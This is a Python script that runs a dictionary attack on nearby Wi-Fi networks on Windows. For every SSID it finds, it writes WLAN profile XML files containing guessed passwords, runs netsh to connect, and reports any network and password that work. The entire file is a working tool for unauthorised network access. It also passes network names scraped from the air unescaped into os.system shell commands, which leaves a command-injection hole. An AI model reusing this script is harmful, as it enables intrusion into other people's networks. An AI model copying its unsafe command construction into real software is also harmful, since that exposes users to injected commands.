import os
import subprocess
import urllib.request
import requests as r
from colorama import Fore


SSID = "SSID"
PASSWORD = ["ReadMyMind"]


def create_new_connection(name, SSID, password):
    """
    establish new connection
    :param name: the network name
    :param SSID: the network SSID (= name)
    :param password: the password for the connection
    """

    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>""" + name + """</name>
	<SSIDConfig>
		<SSID>
			<name>""" + SSID + """</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>""" + password + """</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
</WLANProfile>"""

    with open(name + ".xml", 'w') as file:
        file.write(config)
    command = "netsh wlan add profile filename=\"" + name + ".xml\""
    os.system(command)


def connect(name, SSID):
    """
    function to connect to a network
    :param name: network name
    :param SSID: network SSID (= name)
    """
    command = "netsh wlan connect name=\"" + name + "\" ssid=\"" + SSID + "\""
    os.system(command)


def check_for_connection(host='http://google.com'):
    """
    check if the computer is connected to WiFi
    :param host: a host site to check
    :return: True if the computer is connected, False otherwise.
    """
    try:
        urllib.request.urlopen(host)
        # req = r.get(host)
        return True
    except:
        return False


def try_connection(name, password):
    """
    try to connect to a wifi network
    :param name: the network name
    :param password: the password for the connection.
    :return:
    """
    print("Connecting to: " + Fore.BLUE + name + Fore.WHITE + "\nPassword: " + Fore.BLUE + password + "\n" + Fore.WHITE)
    # establish new connection
    try:
        create_new_connection(name, name, password)
    except FileNotFoundError:
        return False
    # connect to the wifi network
    connect(name, name)

    is_connected = check_for_connection()
    return is_connected


def display_available_networks():
    """
    function to display avavilabe Wifi networks
    :return:
    """
    command = "netsh wlan show networks"
    os.system(command)


def get_available_networks():
    devices = subprocess.check_output(['netsh', 'wlan', 'show', 'network'])
    # decode it to strings
    # devices = devices.decode('ascii')
    devices = devices.decode('utf-8', errors="backslashreplace")
    devices = devices.replace("\r", "")

    return devices


def scrape_network_names(networks_block):
    networks_block_lines = networks_block.split('\n')
    networks_block_SSID_lines = [line for line in networks_block_lines if line.startswith(SSID)]

    networks_names = [line.split(":")[1] for line in networks_block_SSID_lines]
    clean_networks_names = [name[1:] for name in networks_names]
    return clean_networks_names


def main():
    networks_block = get_available_networks()
    networks_name = scrape_network_names(networks_block)

    for network in networks_name:
        for password in PASSWORD:
            is_connected = try_connection(network, password)
            if is_connected:
                print("Connected to:" + Fore.BLUE + network + Fore.WHITE + " with password: "
                      + Fore.BLUE + password + Fore.WHITE)
                return


if __name__ == '__main__':
    main()
